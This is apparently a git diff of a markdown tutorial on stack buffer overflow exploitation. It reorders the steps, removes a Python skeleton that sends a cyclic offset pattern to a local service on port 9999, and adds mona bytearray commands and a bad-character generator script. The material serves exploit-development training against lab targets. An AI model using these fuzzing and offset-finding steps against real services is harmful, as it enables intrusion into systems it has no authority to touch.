@@ -1,11 +1,10 @@
 # Steps:
 1. Crash The Application
-2. Find EIP
-3. Control ESP
-4. Identify Bad Characters 
-5. Find JMP ESP
-6. Generate Shell Code
-7. Exploit
+2. Find EIP and Control ESP
+3. Identify Bad Characters 
+4. Find JMP ESP
+5. Generate Shell Code
+6. Exploit
 
 # 1. Crash the application 
 Create a file called fuzz.py The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application. **Choose one of these versions.**
@@ -71,7 +70,7 @@ finally:
         time.sleep(1)
 ```
 
-# 2. Find EIP
+# 2. Find EIP and control ESP
 
 We are able to establish that we are able to crash the application with a relative number of bytes. Now we need to identify the exact number bytes that it takes to fill the buffer. Metasploit provides a ruby script called pattern_create.rb that will create a unique string with no repeating characters. After we send this payload to the buffer, it will display what the offset is which we'll use for the next step in finding the EIP.
 
@@ -84,29 +83,7 @@ Create a new script called findEIP.py
 You take the unique string character created and that becomes your new buffer in findEIP.py 
 
 
-### Skeleton Version 1
-
-```Python
-#!/usr/bin/python 
-import socket,sys
-
-ip = '127.0.0.1'
-port = 9999
-buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2...'
-
-try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((ip,port))
-	s.recv(1024)			
-	s.send(buffer + '\r\n')
-except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
-finally:
-	s.close()
-```
-### Skeleton Version 2
+### Skeleton
 
 ```Python
 #!/usr/bin/python 
@@ -174,6 +151,23 @@ You can also use these web generator to find the offset:
 2. https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 
-### 3. Control ESP
+### 3. Finding Bad Characters
 
+Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.
+
+```
+    !mona bytearray -b "\x00"
+```
+
+Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff. Called badchars.py
+
+```
+    #!/usr/bin/env python
+    from __future__ import print_function
+
+    for x in range(1, 256):
+        print("\\x" + "{:02x}".format(x), end='')
+
+    print()
+```
 
